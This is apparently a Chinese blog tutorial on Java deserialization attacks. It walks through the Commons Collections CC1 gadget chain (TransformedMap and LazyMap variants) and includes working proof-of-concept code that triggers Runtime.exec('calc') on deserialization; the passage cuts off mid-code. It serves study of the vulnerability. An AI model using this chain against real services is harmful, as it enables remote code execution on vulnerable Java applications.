    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当初学Java反序列化最先遇到的，这也是绕不开的东西。虽然现在对于很多Java反序列化题已经不能直接套用CC链速通，但是很多缝合怪调试到最后一步还是采用的CC链部分，因为原生反序列化肯定是很好用的。</p><p>首先简单介绍一下几个关键词：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">对于利用链上的类，都需要实现Serializable接口、或继承该接口的实现类<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Source：入口类（重写readObject调用常见方法，参数类型宽泛，最好jdk自带）<br>Gadget Chain：调用链（相同方法名、相同参数类型、不同调用过程）<br>Sink：执行类（RCE、SSRF、写文件...）<br></code></pre></td></tr></table></figure><p>常见方法：<code>toString</code>、<code>hashCode</code>、<code>equals</code></p><p>在后面的CC链中经常看到<code>HashMap</code>作为入口类，它实现了<code>Serializable</code>接口且作为jdk自带的类，<code>readObject</code>中调用了常见方法<code>hashCode</code>，是不错的入口类。</p><p>严格来说应该从URLDNS开始写，但是原理也很简单很易懂，只涉及URL类里hashcode里的简单操作触发访问DNS（其实是我懒），就不写了。</p><p>话不多说，直接回到我们梦开始的地方-<strong>Commons Collections</strong>。</p><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>CC1其实用的不多，CC链里用得频繁的其实是CC3（恶意字节码）、CC6以及CC4，还有很少见的CC2，CC1其实就是起到一个引入学习的作用。</p><p>首先依赖就直接</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在这里我用的是<code>Jdk8u401</code>。</p><p>这几个Map都尤为经典，需要深入学习。</p><p><strong>Transformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到<code>Transformer</code>是一个接口，可以接受任意一个<code>Object</code>类型的参数传入。这个接口有几个重要的Map实现类，而且它们都实现了<code>Serializable</code>接口。</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object iConstant;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里<code>ConstantTransformer</code>调用<code>transform()</code>方法返回构造时传入的对象</p><p>写一堆玩意其实就是传入传出一个对象，前后不变。</p><p><strong>InvokerTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125; <span class="hljs-comment">// catch ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个就比较关键了，是反序列化利用的常客。因为它这里的invoke可以执行任意方法。</p><ul><li>iMethodName 待执行的方法名</li><li>iParamTypes 待执行方法的参数列表的参数类型</li><li>iArgs 待执行方法的参数列表</li></ul><p>调用<code>transform</code>的时候会执行input对象的iMethodName方法。</p><p><strong>ChainedTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写一堆，其实就是把多个<code>Transformer</code>串成一条链子，前一个调用返回的结果作为后一个调用的参数。</p><p><strong>TransformedMap</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TransformedMap</code>用于对Java原生Map进行一些修饰，当Map调用<code>setValue</code>时，会触发<code>checkSetValue</code>，进而调用<code>transform</code>。其构造方法被<code>protected</code>修饰，因此我们利用它的静态public方法<code>decorate</code></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>首先我们想到的是使用<code>Transformer</code>的实现类和<code>TransformedMap</code>实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>但是这里有俩问题：</p><ul><li>Runtime类没有实现<code>Serializable</code>接口，无法反序列化</li><li>需要找到<code>readObject</code>中有类似<code>Map.put(xxx,yyy)</code>操作的类</li></ul><p>对于问题一，<code>Class</code>类可以反序列化，那么我们可以用<code>Runtime.class</code>作为<code>ChainedTransformer</code>的入口参数，后面再通过反射来调用exec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>对于问题二，这里有一个完美完成任务的类：<strong>AnnotationInvocationHandler</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// sun.reflect.annotation.AnnotationInvocationHandler#readObject</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                        annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>审一下就可以得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue =》<br>TransformedMap#checkSetValue =》 <br>valueTransformer.transform()<br></code></pre></td></tr></table></figure><p>checkSetValue会因为Map调用setValue方法而调用checkSetValue方法；</p><p>因此让<code>memberValue</code>为上面的evilMap即可。</p><p>但怎么触发到这个setValue呢？</p><p>判断条件在：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; memberType = memberTypes.get(name);<br></code></pre></td></tr></table></figure><p>它需要满足<code>memberType != null</code>才能进入<code>memberValue.setValue</code></p><p>继续跟进：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br></code></pre></td></tr></table></figure><p>再到annotationType：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">annotationType = AnnotationType.getInstance(type);<br></code></pre></td></tr></table></figure><p>构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br></code></pre></td></tr></table></figure><p>type是构造对象时传进来的<code>Annotation子类</code>的<code>Class</code> </p><p>name是传入Map（memberValues）的每个键名</p><p><code>memberType.get(name)</code>要不为空  即要求<code>AnnotationType</code>要有名为<code>name</code>的成员</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(AnnotationType.getInstance(Target.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class [Ljava.lang.annotation.ElementType;&#125;</span><br>System.out.println(AnnotationType.getInstance(Retention.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class java.lang.annotation.RetentionPolicy&#125;</span><br></code></pre></td></tr></table></figure><p>@Retention和@Target都有<code>value</code>这个成员</p><p>另外，<code>AnnotationInvocationHandler</code>的构造方法被default修饰，不能直接new，要利用反射来实例化该类。</p><p>那么我们就得到了<strong>CC1-TransformedMap-POC</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-number">114514</span>);<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">aih</span> <span class="hljs-operator">=</span> cons.newInstance(Target.class, evilMap);<br><br><span class="hljs-comment">// 序列化</span><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(aih);<br>oos.close();<br><br><span class="hljs-comment">// 反序列化</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>ois.close();<br></code></pre></td></tr></table></figure><p>但这个CC1问题很多，首先是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>作为CC1链的入口类， 在<strong>Jdk8u71</strong>之后被修改了，修改后的<code>readObject</code>方法中新建了一个<code>LinkedHashMap</code>对象，并将原来的键值添加进去。</p><p>所以，后续对Map的操作都是基于这个新的<code>LinkedHashMap</code>对象，而原来我们精心构造的Map不再执行setValue或put操作，也就不会触发RCE了。</p><p>接下来就要引入<strong>CC1-LazyMap</strong>的方法，这也是ysoserial中的方法。</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>分析完上面的链子其实就很显然，CC链的关键在于<code>transform()</code>的触发,上面那条<code>TransformedMap</code>的触发在于“外援”<code>AnnotationInvocationHandler</code>的<code>readObject</code>调用了<code>setValue</code>，进而触发<code>TransformedMap</code>的<code>checkSetValue</code>，进而触发<code>transform()</code></p><p>而<code>LazyMap</code>是另一个触发点备选，因为<code>LazyMap</code>的<code>get</code>方法中会执行<code>factory.transform()</code>，也暗合“懒加载”的真谛。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LazyMap</code>由get触发，对比一下可以发现：</p><ul><li>LazyMap：get元素时触发</li><li>TransformedMap：set元素时触发</li></ul><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>        <span class="hljs-comment">//恶意对象反射链部分</span><br>ChainedTransformer#transform()<br>ConstantTransformer#transform()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Class#getMethod()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#getRuntime()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#exec()<br></code></pre></td></tr></table></figure><p>与前面分析的<code>TransformedMap</code>不同，在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>方法中并没有直接调用到Map的get方法。</p><p>但是ysoserial找到了<code>AnnotationInvocationHandler</code>的invoke方法中调用了get：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>    <span class="hljs-comment">// Handle Object and Annotation methods</span><br>    <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>        paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>        <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span> (paramTypes.length != <span 